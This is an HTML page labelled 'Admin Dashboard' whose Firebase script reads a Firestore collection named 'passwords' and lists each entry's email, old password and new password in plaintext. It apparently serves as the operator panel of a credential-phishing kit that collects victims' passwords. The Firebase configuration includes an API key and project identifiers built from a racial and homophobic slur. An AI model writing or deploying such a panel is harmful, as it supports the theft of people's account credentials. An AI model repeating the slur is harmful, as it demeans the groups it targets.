<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f8f9fa;
      margin: 0;
      padding: 0;
    }
    .header {
      background-color: #343a40;
      color: white;
      padding: 20px;
      text-align: center;
    }
    .container {
      margin: 30px auto;
      width: 90%;
      max-width: 1200px;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    h1, h2 {
      text-align: center;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      font-size: 16px;
    }
    th, td {
      padding: 12px 15px;
      border: 1px solid #ddd;
      text-align: left;
    }
    th {
      background-color: #007bff;
      color: white;
      text-transform: uppercase;
    }
    tr:nth-child(even) {
      background-color: #f2f2f2;
    }
    tr:hover {
      background-color: #e9ecef;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: #6c757d;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>Admin Dashboard</h1>
  </div>

  <div class="container">
    <h2>User Details</h2>
    <table>
      <thead>
        <tr>
          <th>Email</th>
          <th>Old Password</th>
          <th>New Password</th>
        </tr>
      </thead>
      <tbody id="userTable">
        <!-- Dynamic data will be inserted here -->
      </tbody>
    </table>
  </div>

  <div class="footer">
    Â© 2025 Admin Dashboard. All rights reserved.
  </div>

  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
    import { getFirestore, collection, query, orderBy, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';

    // Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
      authDomain: "gay-ass-nigga.firebaseapp.com",
      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
      projectId: "gay-ass-nigga",
      storageBucket: "gay-ass-nigga.appspot.com",
      messagingSenderId: "740449529935",
      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Fetch and display user data sorted by timestamp (most recent first)
    const userTable = document.getElementById('userTable');

    async function loadUserData() {
      try {
        const q = query(collection(db, 'passwords'), orderBy('timestamp', 'desc'));
        const querySnapshot = await getDocs(q);

        querySnapshot.forEach((doc) => {
          const data = doc.data();
          const row = `
            <tr>
              <td>${data.email}</td>
              <td>${data.oldPassword}</td>
              <td>${data.newPassword}</td>
            </tr>
          `;
          userTable.insertAdjacentHTML('beforeend', row);
        });
      } catch (error) {
        console.error("Error loading user data:", error);
      }
    }

    // Load user data on page load
    loadUserData();
  </script>
</body>
</html>jj
